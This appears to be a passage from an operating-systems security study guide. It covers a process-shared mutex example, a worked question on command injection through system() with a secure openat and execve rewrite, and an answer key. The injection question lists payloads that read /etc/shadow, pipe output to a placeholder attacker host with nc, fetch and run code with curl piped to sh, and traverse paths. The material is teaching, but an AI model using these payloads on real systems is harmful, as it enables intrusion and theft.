**The general point about shared memory.** It is the **fastest IPC mechanism precisely because the kernel is not involved per access** — but that is the same sentence as "the kernel is not there to serialise anything for you". Pipes and sockets give ordering and blocking semantics for free via **kernel buffers**, and put a reader to sleep on an empty pipe. Shared memory gives you raw pages and **requires you to build synchronisation yourself**. Faster, and deliberately puncturing isolation, are two descriptions of one design choice.

**The corrected version.** The mutex must itself live **in the shared mapping** and be initialised with `PTHREAD_PROCESS_SHARED` — a mutex in private memory would be duplicated by `fork` and protect nothing:

```c
/* compile with: gcc -pthread shared.c */
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/wait.h>

#define ITER 100000

struct region {
    pthread_mutex_t lock;        /* the lock lives in shared memory too */
    long            counter;
};

int main(void) {
    struct region *r = mmap(NULL, sizeof(*r),
                            PROT_READ | PROT_WRITE,
                            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (r == MAP_FAILED) {                       /* (1) the correct sentinel */
        perror("mmap");
        return 1;
    }

    pthread_mutexattr_t attr;
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);   /* (2) */
    if (pthread_mutex_init(&r->lock, &attr) != 0) {
        munmap(r, sizeof(*r));
        return 1;
    }
    pthread_mutexattr_destroy(&attr);

    r->counter = 0;

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        munmap(r, sizeof(*r));
        return 1;
    }

    for (int i = 0; i < ITER; i++) {
        pthread_mutex_lock(&r->lock);
        r->counter++;                            /* the critical section */
        pthread_mutex_unlock(&r->lock);
    }

    if (pid == 0)
        _exit(0);

    wait(NULL);
    printf("total = %ld\n", r->counter);         /* always 200000 */
    pthread_mutex_destroy(&r->lock);
    munmap(r, sizeof(*r));
    return 0;
}
```

For a single word, `atomic_long` with `atomic_fetch_add` is simpler and faster — one atomic instruction, no lock at all. The mutex version is shown because it generalises to a **multi-field critical section**, where **both atomicity rules** are needed: not merely one process at a time, but no interleaving once an update has started, which is what protects a half-written structure from being read.

**The performance note that ties back to Part 2.** Because the lock is a **futex**, the uncontended path is an atomic compare-and-swap in userspace and costs **no system call**; the kernel is entered only when a process must actually sleep or be woken. So the corrected version keeps almost all of shared memory's speed advantage — you pay for synchronisation only when there is genuine contention.

---

### Question 24 — Building a command line for `system()`

**Q:** Explain why this is vulnerable even though the `snprintf` cannot overflow, demonstrate an exploit, and give a secure rewrite.

```c
#include <stdio.h>
#include <stdlib.h>

void show_log(const char *username) {
    char cmd[256];

    snprintf(cmd, sizeof(cmd), "cat /var/log/app/%s.log", username);
    system(cmd);
}
```

**Answer & Explanation:**

**What is not wrong.** `snprintf` is correctly bounded by `sizeof(cmd)` and always NUL-terminates, so **there is no buffer overflow**, and the format string is a **literal** with the untrusted data passed as a `%s` argument, so this is **not** a format-string bug either. Both of Chapter 2's obvious readings are wrong here.

**The actual bug — `system` runs a shell.** `system(cmd)` is equivalent to `execl("/bin/sh", "sh", "-c", cmd, NULL)`. The string is not passed to `cat` as an argument; it is handed to **`/bin/sh` to be parsed as a shell command**. Shell metacharacters in `username` are therefore **syntax, not data** — this is **command injection**, and the trust-boundary failure is that untrusted input is interpolated into a language before being interpreted.

**The exploit.** With `username` under attacker control:

```
username = "x; id; echo owned"
  →  cat /var/log/app/x.log; id; echo owned
```

The `;` terminates the `cat` and the attacker's commands run as whatever user this process is — root, if the program is setuid or a system daemon. Other separators work identically and some need no `;` at all:

```
username = "$(cat /etc/shadow)"        command substitution
username = "x | nc attacker 1234"      pipe the output out
username = "x && curl … | sh"          fetch and execute
username = "../../../../etc/passwd#"   path traversal, comment out the suffix
```

The last is worth noting separately: **even with a perfect shell-metacharacter filter, `../` traversal escapes the intended directory**, because the vulnerability is really two — an injection *and* an unvalidated path.

**Why filtering is the wrong instinct.** Blocking `;` leaves `|`, `&`, `` ` ``, `$()`, newline, `<`, `>`, `*`, `?`, and quoting interactions; the shell's grammar is large and the exact set varies between shells. Escaping is a whitelist problem disguised as a blacklist problem. **The fix is to remove the shell**, not to try to out-parse it.

**The secure rewrite — no shell, and no external program at all.** The task is "read a file", so do that directly. The filename is validated against an allowlist, and the file is opened relative to a directory handle so the name cannot escape it:

```c
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>

static int valid_username(const char *s) {
    if (s == NULL || *s == '\0' || strlen(s) > 32)
        return 0;
    for (const char *p = s; *p; p++)                 /* allowlist, not blocklist */
        if (!isalnum((unsigned char)*p) && *p != '_' && *p != '-')
            return 0;
    return 1;                                        /* no '/', no '.', so no traversal */
}

int show_log(const char *username) {
    if (!valid_username(username))
        return -1;

    int dir = open("/var/log/app", O_RDONLY | O_DIRECTORY);
    if (dir < 0)
        return -1;

    char name[64];
    snprintf(name, sizeof(name), "%s.log", username);

    int fd = openat(dir, name, O_RDONLY | O_NOFOLLOW);   /* confined to that dir */
    close(dir);
    if (fd < 0)
        return -1;

    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        if (write(STDOUT_FILENO, buf, (size_t)n) != n)
            break;

    close(fd);
    return 0;
}
```

**If an external program genuinely must be run**, use `fork` + `execve` with an **argument vector**, so arguments are passed as data and never parsed:

```c
#include <sys/wait.h>         /* waitpid */

    pid_t pid = fork();
    if (pid < 0)
        return -1;

    if (pid == 0) {
        char path[128];
        snprintf(path, sizeof(path), "/var/log/app/%s.log", username);  /* validated */
        char *argv[] = { "/bin/cat", "--", path, NULL };
        char *envp[] = { "PATH=/usr/bin:/bin", NULL };
        execve(argv[0], argv, envp);
        _exit(127);
    }

    int status;
    waitpid(pid, &status, 0);
```

Here `path` is **one element of `argv`**, so a `;` inside it is a literal semicolon in a filename — there is no shell to interpret it. `--` stops `cat` treating a leading `-` as an option, and `envp` is minimal so `LD_PRELOAD` and `PATH` cannot be used against the child.

**The pattern this shares with the format-string bug.** In both cases untrusted data is placed where a **language** is expected — a format string, a shell command — and the danger is **interpretation, not length**. Bounds checking is irrelevant to both. The rule generalises: **pass untrusted input as an argument, never as syntax.** The same reasoning gives parameterised SQL queries instead of concatenated ones, and it is why the shell/command-line parser is on the list of software classes known to suffer from bugs — its **interface complexity is proportional to the richness of the language it accepts**, and it accepts a very rich one.

---

## Answer Key Summary

| # | Topic | Key answer |
|---|---|---|
| 7 | Address space | 2⁴⁸ = **256 TiB**; **2³⁶** pages; flat table = **512 GiB/process**; 4×9+12 = 48 |
| 8 | VA `0x7F3CA81B2C40` | L4=**254**, L3=**242**, L2=**320**, L1=**434**, offset=**3136**; PA = **0x1A2B3C40**; 5 accesses |
| 9 | Mapping 1 GiB | **512** L1 + 1 + 1 + 1 = **515** tables = **≈2.01 MiB** = **0.196%** overhead |
| 10 | Kernel-crossing cost | 10⁶ syscalls = **0.167–0.333 s**; futex uncontended = **0 syscalls**; `malloc` is **not** a syscall |
| 11 | Copy-on-write | 1024 pages after fork → **1027** after 3 writes; eager = 2048; **3** page faults; 4 KB granularity |
| 12 | CFS | timeslices **18.084 / 5.916 ms**; vruntime **0.009766 / 0.029851** → **A** next; ratio **3.057** |
| 13 | `fork` loop | **8** processes, **8** lines; `n` forks → **2ⁿ** |
| 14 | `fork` state | `child : global=15 local=25` then `parent: global=10 local=20` |
| 15 | Buffering | **`AB` / `AB`** — buffered `A` is duplicated by `fork`; fix with `fflush` → `AB` / `B` |
| 16 | `fork`+`execve` | `child before` / `replaced` / `parent done`; a returning `execve` **failed** |
| 17 | Threads | `0` / `100` / `100`, **same PID** throughout; `fork` version shows `0` and a different PID |
| 18 | Data race | any value in **[100000, 200000]**; `counter++` is load-add-store |

**The chapter's load-bearing claims, for quick revision:**

* The kernel runs **at boot and on interrupts only**; interrupts are **hardware interrupts or software exceptions**; a **syscall is a software exception**, not a third category — which is why preemption is deferred to interrupt-return and signals are delivered just before returning to userspace.
* An **ABI, not an API**, is required to reach the kernel, because the caller and the kernel are separately compiled and possibly in different languages. Syscall args go in `%rdi`, `%rsi`, `%rdx`, **`%r10`**, `%r8`, `%r9` with the id in `%rax` — `%r10` replaces `%rcx` because the `syscall` instruction clobbers `%rcx`.
* **Two mechanisms** enforce memory isolation, and they are different in kind: **separate page tables** (process↔process, separation) and the **user/supervisor bit** (process↔kernel, permission).
* **Threads are scheduled, not processes** — same PID, distinct TID, one shared page table, hence **no isolation between threads**, hence sandboxes use processes.
* **Atomicity has two rules:** one at a time, **and** no interleaving once started.
* **`vruntime` = runtime ÷ weight**, with **two** preemption triggers — timeslice expiry, **and a waking thread with a smaller `vruntime`** — which is where interactive responsiveness comes from with no special case.
* **A secure OS is an oxymoron**: the TCB must mediate everything, be correct and be tamper-proof, but it is large, written in memory-unsafe languages, hard to define and effectively impossible to verify. Hence threat models, TCB reduction and layered mitigation instead of security outright.
